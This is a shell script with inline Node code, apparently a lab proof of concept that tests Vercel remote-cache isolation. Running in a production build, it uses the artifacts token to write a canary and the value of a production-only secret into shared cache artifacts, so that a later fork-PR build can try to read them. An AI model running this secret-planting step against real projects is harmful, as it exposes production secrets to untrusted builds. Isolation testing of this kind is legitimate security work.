#!/bin/sh
# Runs in the PRODUCTION build (default branch) of the lab project.
# Uploads artifacts under hashes we choose, so that a later fork-PR build
# can try to read them and prove whether it can reach the shared namespace.
node -e '
const ep = process.env.VERCEL_API_ENDPOINT || "https://api.vercel.com";
const team = process.env.VERCEL_ARTIFACTS_OWNER || "";
const AT = process.env.VERCEL_ARTIFACTS_TOKEN || "";
const put = async (hash, text) => {
  try {
    const r = await fetch(ep + "/v8/artifacts/" + hash + "?teamId=" + team, {
      method: "PUT",
      headers: { Authorization: "Bearer " + AT, "Content-Type": "application/octet-stream" },
      body: Buffer.from(text)
    });
    const t = (await r.text()).slice(0, 160).replace(/\n/g, " ");
    console.log("SHARED-WRITE " + hash + " -> HTTP " + r.status + " | " + t);
    return r.status;
  } catch (e) { console.log("SHARED-WRITE ERR " + e.message); return 0; }
};
(async () => {
  const a = await put("lab-shared-read-proof-v1",
    "PROD-ARTIFACT-CANARY-8336db7bc74b6183 env=" + (process.env.VERCEL_ENV || "?"));
  const secret = process.env.LAB_PROD_ONLY || "MISSING";
  const b = await put("lab-prodsecret-v1",
    "PROD-ONLY-SECRET-VALUE=" + secret + " (written by " + (process.env.VERCEL_ENV || "?") + " build)");
  require("fs").writeFileSync("public/index.html",
    "<h1>lab production build</h1><p>artifact writes: " + a + " / " + b + "</p>");
})();
' 2>&1
sleep 6
cat public/index.html
